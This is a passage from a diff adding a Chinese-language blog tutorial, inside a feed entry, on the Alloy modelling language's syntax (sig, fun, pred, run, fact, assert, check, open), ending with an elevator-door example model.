+<p>语法：<code>module module_name</code><br>
+Module 会定义当前模型的名。出现在文件第一行。Module可有可无。</p>
+<h5 id="signature">Signature：</h5>
+<p>语法：<code>sig sig_name { field declarations... }</code>或者<code>sig sig_name { field declarations... }{ signature facts... }</code><br>
+Signature 和 Java 的Class有些类似， 有<code>abstract sig</code> 和<code>extend sig</code>。<br>
+<code>sig</code> 例子：</p>
+<pre><code class="language-alloy">  sig FSObject { }
+  sig Dir {
+      contents: set FSObject
+  }
+  sig FileSystem {
+      root: one Dir,
+  }
+</code></pre>
+<p><code>abstract sig</code> 和<code>extend sig</code> 例子：</p>
+<pre><code class="language-alloy">  sig 
+  abstract sig A {
+    r: set A
+  }
+  sig B extends A {
+    //fields
+  }
+  sig C extends A {
+    //fields
+  }
+</code></pre>
+<p>这里 B 和 C 是 A 的子集，因为 B 和 C 都有 r 这个 field。 并且 B 和 C 不相交。</p>
+<h5 id="function">Function ：</h5>
+<p>语法：<code>fun name [arg1, ……] : e1 { e2 }</code><br>
+fun 返回一个值。这里这些变量是可选的。<br>
+e1是返回值的类型和大小<br>
+e2是要返回的值<br>
+例子：</p>
+<pre><code class="language-alloy">fun lookup[m: Map, k: Key]: set Value { k.(m.values) }
+fun test[s : State] : set File {
+   {f: File | f.(s.time) = max[File.(s.time)]}
+}
+</code></pre>
+<h5 id="predicate">Predicate ：</h5>
+<p>语法：<code>pred name [arg1, arg2，……] {formulars}</code><br>
+pred 返回true或者false。这里这些变量是可选的。<br>
+和Prolog类似，如果想要<code>pred</code>执行特定操作的话，可以把输出的变量作为<code>pred</code>的输入。当<code>pred</code>返回true时，作为输出的变量就相当于<code>pred</code>执行完后的输出。<br>
+例子1：</p>
+<pre><code class="language-alloy">pred show(){
+    some root
+    #FSObject &gt; 1
+}
+</code></pre>
+<p>例子2：</p>
+<pre><code class="language-alloy">pred test[s, s' : State] {
+   // your constraints here
+   all f : File | lt[s'.time[f],s.time[f]]
+}
+</code></pre>
+<h5 id="run">Run：</h5>
+<p>语法：<code>name: run {set} for n</code>或者<code>name: run pred_name for n</code><br>
+run 会根据当前模型生成满足特定predicate的实例。<br>
+name可以不写。n为执行的scope，如果不写的话默认为for 3。如果需要特定数量的sig的话，可以写为 和for n but x sig1， y sig2 ……<br>
+例子：</p>
+<pre><code class="language-alloy">runPrep1: run {some State} for 3
+run {} for 10  but exactly 10 Person 
+run show for 3
+</code></pre>
+<h5 id="fact">Fact：</h5>
+<p>语法：<code>fact name {formulars}</code><br>
+fact 将约束模型生成的实例， 生成的所有实例满足特定的predicate。<br>
+name可以不写。<br>
+例子：</p>
+<pre><code class="language-alloy">fact { all d: Dir, o: d.contents | o.parent = d }
+fact test {
+   Floor in FirstFloor.*up
+   all f: TopFloor {no f.up}
+   no f:Floor | f in f.^up
+}
+</code></pre>
+<h5 id="assertions">Assertions</h5>
+<p>语法：<code>assert name { formulas }</code><br>
+assert和pred类似，但是不接受变量，仅用于检查模型是否满足特定predicate。<br>
+例子：</p>
+<pre><code class="language-alloy">assert test_1 {
+   all s : State | test_pred1[s] =&gt; all s' : State | !test_pred2[s, s']
+}
+</code></pre>
+<h5 id="check">Check</h5>
+<p>语法：<code>name: check {formulformulas } for n</code>或者<code>name: run pred_name for n</code><br>
+check 用于检查模型生成的实例中有没有特定Assertion的反例。如果存在反例，alloy会显示不满足Assertions的实例。如果不存在反例，证明Assertion在当前模型中成立。<br>
+例子：</p>
+<pre><code class="language-alloy">check test_1 for 2
+removeAllSame: check {
+  all fs, fs1, fs2: FileSystem, f: File |
+    remove[fs, fs1, f] &amp;&amp; removeAll[fs, fs2, f] =&gt; fs1.live = fs2.live
+} for 5
+</code></pre>
+<h2 id="0x03-import-模型">0x03 import 模型</h2>
+<h5 id="open">Open</h5>
+<p>语法：<code>open somePath/someExample</code><br>
+open 需要在model下面。<br>
+somePath是someExample.als的路径。<br>
+这相当于将someExample.als模型的内容添加到模型中。所以要避免名字冲突。<br>
+例子：</p>
+<pre><code class="language-alloy">   open util/ordering[State]
+</code></pre>
+<h2 id="0x04-helloworld">0x04 HelloWorld</h2>
+<pre><code class="language-alloy">//定义一个电梯门的软件模型
+module Elevator
+//定义一个门
+abstract sig Door {}
+//定义两个门的状态
+one sig Open extends Door {}
+one sig Closed extends Door {}
+//定义电梯移动
+abstract sig Movement {}
+//定义两个移动的状态
+one sig Move extends Movement {}
+one sig None extends Movement {}
+//定义电梯, 内含移动状态和门的状态
+sig Elevator {
+	movement : Movement,
+	door : Door}
+//定义一个约束规则: 电梯门开的时候不移动, 不移动的时候门开着
+fact{
+   all f: Elevator {f.door=Open &lt;=&gt; f.movement=None} 
+}
+//定义一个开关门的函数
+pred switch[f, f': Elevator] { 
+    f.door=Open &lt;=&gt; f'.door=Closed
+    f.door=Closed &lt;=&gt; f'.door=Open
+    f.movement=None &lt;=&gt;f'.movement=Move 
+    f.movement=Move &lt;=&gt;f'.movement=None 
+}
+//定义一个假设: 有的电梯开着门移动
+assert test_2 { some f : Elevator{ f.door=Open &amp;&amp; f.movement=Move} }
+//检查假设
+check test_2
+//运行switch函数, 查看状态
+run {some f, f': Elevator | switch[f, f']} for 3 but exactly 3 Elevator
+//验证模型
+run {}
+</code></pre>
+<p>执行 check 将会输出:<br>
+<code>Counterexample found. Assertion is invalid.</code><br>
+执行第一个 run 将会输出图片, 显示电梯的三个状态:<br>
+执行第二个 run 会显示电梯和各种状态的关系:</p>
+]]></content>
+    </entry>
+</feed>
